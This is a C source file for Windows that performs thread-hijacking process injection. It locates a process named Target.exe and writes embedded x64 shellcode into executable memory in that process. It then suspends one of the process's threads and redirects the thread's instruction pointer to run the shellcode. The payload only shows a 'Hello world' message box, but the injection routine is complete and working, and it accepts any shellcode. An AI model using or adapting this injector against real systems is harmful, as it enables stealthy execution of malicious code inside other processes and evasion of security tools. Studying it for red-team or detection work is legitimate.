#include <Windows.h>
#include <Psapi.h>
#include <tchar.h>
#include <stdbool.h>
#include <TlHelp32.h>
#include <stdio.h>

char MessageBoxShellcode[] =
	"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
	"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
	"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
	"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
	"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
	"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
	"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
	"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
	"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
	"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
	"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
	"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
	"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
	"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
	"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
	"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
	"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
	"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
	"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
	"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
	"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
	"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
	"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
	"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
	"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
	"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
	"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
	"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
	"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

typedef struct HijackData {
	const wchar_t	*processName;	// 8
	HANDLE			hProcess;		// 8
	HANDLE			hThread;		// 8
	DWORD			processId;		// 4
} t_HijackData;

static void InitHijackData(t_HijackData *data) {
	if (!data) {
		return;
	}

	data->processName = NULL;
	data->processId = 0;
	data->hProcess = NULL;
	data->hThread = NULL;
}

static void CleanHijackData(t_HijackData *data) {
	if (!data) {
		return;
	}

	if (data->hThread) {
		CloseHandle(data->hThread);
		data->hThread = NULL;
	}

	if (data->hProcess) {
		CloseHandle(data->hProcess);
		data->hProcess = NULL;
	}

	data->processId = 0;
	data->processName = NULL;
}

static bool OpenTargetProcess(t_HijackData *data) {
	HANDLE			hSnapshot = NULL;
	PROCESSENTRY32	processEntry = {0};

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[ ERROR ] Failed to create process snapshot: %lu", GetLastError());
		return false;
	}

	processEntry.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &processEntry)) {
		printf("[ ERROR ] Failed to get first process: %lu", GetLastError());
		CloseHandle(hSnapshot);
		return false;
	}

	do {
		if (wcscmp(data->processName, processEntry.szExeFile) == 0) {
			data->processId = processEntry.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &processEntry));

	CloseHandle(hSnapshot);

	if (data->processId == 0) {
		printf("[ ERROR ] Process not found: %ls", data->processName);
		return false;
	}

	data->hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ |
		PROCESS_VM_WRITE |
		PROCESS_VM_OPERATION,
		false,
		data->processId
	);

	if (!data->hProcess) {
		printf("[ ERROR ] Failed to open process: %lu", GetLastError());
		return false;
	}

	return true;
}

static bool OpenTargetThread(t_HijackData *data) {
	HANDLE			hSnapshot = NULL;
	THREADENTRY32	threadEntry = {0};
	DWORD			threadId = 0;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[ ERROR ] Failed to create threads snapshot: %lu", GetLastError());
		return false;
	}

	threadEntry.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hSnapshot, &threadEntry)) {
		printf("[ ERROR ] Failed to get first thread: %lu", GetLastError());
		CloseHandle(hSnapshot);
		return false;
	}

	do {
		if (data->processId == threadEntry.th32OwnerProcessID &&
			threadEntry.th32ThreadID != GetCurrentThreadId())
		{
			threadId = threadEntry.th32ThreadID;
			break;
		}
	} while (Thread32Next(hSnapshot, &threadEntry));

	CloseHandle(hSnapshot);

	if (threadId == 0) {
		printf("[ ERROR ] Failed to find thread for process: %ls", data->processName);
		return false;
	}

	data->hThread = OpenThread(
		THREAD_SUSPEND_RESUME |
		THREAD_GET_CONTEXT |
		THREAD_SET_CONTEXT |
		THREAD_QUERY_INFORMATION,
		false,
		threadId
	);

	if (!data->hThread) {
		printf("[ ERROR ] Failed to open thread: %lu", GetLastError());
		return false;
	}

	return true;
}

static bool Hijack(const wchar_t *processName, t_HijackData *data) {
	CONTEXT context;
	ZeroMemory(&context, sizeof(context));
	context.ContextFlags = CONTEXT_FULL;

	if (!processName || !data) {
		printf("[ ERROR ] Enter a valid processName!");
		return false;
	}

	data->processName = processName;

	if (!OpenTargetProcess(data)) {
		return false;
	}

	LPVOID hijackBuffer = VirtualAllocEx(
		data->hProcess,
		NULL,
		sizeof(MessageBoxShellcode),
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	if (!hijackBuffer) {
		printf("[ ERROR ] Failed to allocate hijackBuffer: %lu", GetLastError());
		return false;
	}

	if (!WriteProcessMemory(
		data->hProcess,
		hijackBuffer,
		MessageBoxShellcode,
		sizeof(MessageBoxShellcode),
		NULL
	))
	{
		printf("[ ERROR ] Failed to write the hijackBuffer: %lu", GetLastError());
		return false;
	}

	if (!OpenTargetThread(data)) {
		return false;
	}

	if (SuspendThread(data->hThread) == (DWORD)-1) {
		printf("[ ERROR ] Failed to suspend thread: %lu", GetLastError());
		return false;
	}

	if (!GetThreadContext(data->hThread, &context)) {
		printf("[ ERROR ] Failed to get thread context: %lu", GetLastError());
		return false;
	}

	context.Rip = (uintptr_t)hijackBuffer;

	if (!SetThreadContext(data->hThread, &context)) {
		printf("[ ERROR ] Failed to set the hijacked context: %lu", GetLastError());
		return false;
	}

	if (ResumeThread(data->hThread) == (DWORD)-1) {
		printf("[ ERROR ] Failed to resume thread after hijack: %lu", GetLastError());
		return false;
	}

	return true;
}

int main() {
	t_HijackData data;

	InitHijackData(&data);

	if (!Hijack(L"Target.exe", &data)) {
		CleanHijackData(&data);
		while(1) {}
		return 1;
	}

	CleanHijackData(&data);
	return 0;
}